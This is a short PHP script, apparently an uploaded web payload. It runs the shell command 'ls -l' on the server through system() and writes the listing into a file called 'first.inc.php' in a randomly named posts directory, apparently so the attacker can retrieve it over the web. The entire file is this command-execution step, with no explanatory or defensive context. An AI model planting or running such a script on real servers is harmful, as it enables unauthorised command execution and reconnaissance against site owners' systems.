<?php 
$data=system("ls -l"); 
#echo $data;
$filename = "31f6bd159f/posts/first.inc.php";
$file = fopen( $filename, "w" );
fwrite( $file, $data);
fclose( $file );
?>
